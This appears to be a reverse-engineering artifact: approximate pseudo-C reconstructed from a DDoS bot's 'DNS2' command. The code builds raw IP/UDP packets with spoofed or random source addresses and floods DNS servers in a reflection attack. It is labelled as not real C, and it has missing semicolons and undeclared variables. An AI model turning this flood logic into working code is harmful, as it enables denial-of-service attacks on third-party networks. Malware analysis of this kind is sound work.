/*
 *   This is an approximate "decompilation" of the function that implements the DNS2 command
 *
 *   Warning:  this is not intended as actual C code.  just a representation that 
 *   looks like C in order to see the structure.
 */
void f_8049564( byte a1, byte a2, byte a3, byte a4,
	   byte b1, byte b2, byte b3, byte b4,
	   int  f1, byte w1, byte w2, int f2,
	   byte *hostname)
{
	int vfdc[9];
        int vde8[0x7d];
	byte *bpp;  /* v978 */

	byte ip1_1,ip1_2,ip1_3,ip1_4;
	byte ip2_1,ip2_2,ip2_3,ip2_4;

	char v9b8[15];  /* size unknown */

	struct sockaddr_in addr;

        ip1_1 = a1;
        ip1_2 = a2
        ip1_3 = a3;
        ip1_4 = a4;
        ip2_1 = b1;
        ip2_2 = b2
        ip2_3 = b3;
        ip2_4 = b4;

	memcpy(vfdc, g_698, 9*sizeof(int));
	memcpy(vde8, g_6bc, 0x7d*sizeof(int));

	v988 = &v9ec;
	v98e = &v9f4;
	saddr.sin_family = AF_INET; /* 2*/ /* dd8 + 8  (0x10 )*/
	saddr.sin_port = 0;  /* word */
		
	/*  5db -609 */

	if(f2 != 0)
        {
		sprintf(v9b8, "%d.%d.%d.%d", ip1_1, ip1_2, ip1_3, ip1_4);
	}

	if(f1 != 0)
		f1--;

	sock = socket( 2, 3, 0xff);

	if(sock <= 0)
		goto Exit;

	v980 = 0;
	v97c = 0;

	
	memset( &v98d, 0, 0x400 );

	while(1)
	{
		redo = 0;   /* si */
		if(f2 != 0 && v97c <= 0)   
		{
			do{
				he = gethostbyname( hostname );
				if(he == 0)
				{
					sleep(0x258);
					redo = 1;
				}
				else
				{
					memcpy(&v9b4, *he->h_addr_list, 4);
					*(int *)(di+0x10) = v9b4;
					saddr.sin_addr = v9b4;
					v97c = 0x97c;
				}
			}while(redo != 0);
		}

		bpp = ((byte *)&ip1_1)-8;
		
		for(si=0; si < 9; si++)
		{
			if( f2 == 0)
				vddc = inet_addr(v9b8);

			memcpy( &saddr.sin_addr, bpp + 0xfffffde8, vfdc[si]);
			       /* orig &vde8 then 32b back the stack ... */

			v984[0] = random%255;
			v985[1] = random%255;

			if( w1 == 0 && w2 == 0 )
			{
				t = random % 0x7530;
			}
			else
			{
				t = w1 << 8 + w2;
			}

			*(int16 *)v988 = htons(t);
			*(int16 *)(v988+2) = 0x3500;
			*(int16 *)(v988+4) = htons(fdc[si]+8);
			*(int16 *)(v988+6) = 0;

			if(ip2_1 == 0 && ip2_2 == 0 &&
			   ip2_3 == 0 && ip2_4 == 0 )
			{
				v9e4 = random%0xff;  /* not quite */
				v9e5 = random%0xff;  /* not quite */
				v9e6 = random%0xff;  /* not quite */
				v9e7 = random%0xff;  /* not quite */
			}
			else
			{
				v9e4 = ip2_1;
				v9e5 = ip2_2;
				v9e6 = ip2_3;
				v9e7 = ip2_4;
			}

			if(f2 == 0)
			{
				v9e8 = ip1_1;
				v9e9 = ip1_2;
				v9ea = ip1_3;
				v9eb = ip1_4;
			}

			di[0] = 0x45;
			di[8] = 0x78 + random()%0x82;
			*(int16 *)(di+2) = htons( 0x1c + fdc[si] );
			*(int16 *)(di+0xa) = 0;
			*(int16 *)(di+0xa) = ip_hdr_cksum( di );

			sendto( sock, v9d8, 0x1c+fdc[si], 0, vdd8, 0x10);

			if(f1 == 0)
			{
				usleep(0x12c);
				v97c--;
			}
			else if(f1 == v980)
			{
				usleep(0x12c);
				v980 = 0;
				v97c--;
			}
			else
			{
				v980++;
			}
			
			bpp += 32;

		}
	}

Exit:
	g_774 = 0;
	return 0;
}
